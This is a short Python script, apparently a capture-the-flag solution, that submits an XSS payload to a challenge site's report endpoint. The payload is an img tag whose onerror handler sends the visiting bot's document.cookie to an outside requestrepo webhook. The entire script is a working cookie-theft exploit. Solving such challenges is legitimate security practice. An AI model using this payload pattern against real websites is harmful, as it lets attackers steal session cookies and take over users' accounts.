import requests
import urllib.parse

chall_url = 'https://sandbox-viewer-web.challs.infobahnc.tf/'
webhook = 'https://fj0s0rpb.requestrepo.com/'
payload = f'<img src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.4/purify.min.js" referrerpolicy="unsafe-url" onerror="location=\'{webhook}?\'+document.cookie">'

r = requests.get(chall_url + 'report?key=' + urllib.parse.quote_plus(payload))
print(r.text)
